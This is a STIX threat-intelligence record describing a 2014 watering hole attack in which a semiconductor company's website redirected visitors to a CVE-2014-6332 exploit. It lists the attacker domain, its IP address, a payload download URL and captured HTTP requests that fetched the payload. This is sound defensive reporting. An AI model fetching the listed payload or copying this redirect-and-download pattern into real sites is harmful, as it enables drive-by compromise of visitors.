stix:STIX_Header.stix:Title: Watering Hole Attack on Legitimate Semiconductor Website Redirects to CVE-2014-6332 Exploit
stix:STIX_Header.stix:Description: On 22 November 2014, malicious redirects were observed on the legitimate manufacturing website scd.co.il. The redirect exploits CVE-2014-6332. If the vulnerability is successfully exploited a file is downloaded from the malicious domain picture.usascd.com.

stix:Indicator.indicator:Description:
This domain resolves to 202.133.23.145.
The similar subdomain www.usascd.com was reported in IB-14-10404.

This subdomain was also reported with this activity. It was reported to resolve to 202.133.23.145.
The similar subdomain www.usascd.com was reported in IB-14-10404.
After exploitation, this file is retrieved from http://picture.usascd.com/kb20140916.rar

This is the HTTP GET request from the redirect on the legitimate site scd.co.il.
GET /google.html HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */* Referer: http://www.scd.co.il/ Accept-Language: en-us Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; BTRS101170; .NET CLR 2.0.50727) Host: picture.usascd.com Connection: Keep-Alive
The code on the malicious website appears to use some of the same variable names as the proof of concept exploit code published by the researcher Yuange1975. This code is referenced in the following blog entry.
http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/

This the HTTP GET request to download the file after exploitation.
GET /kb20140916.rar HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; BTRS101170; .NET CLR 2.0.50727) Host: picture.usascd.com Connection: Keep-Alive
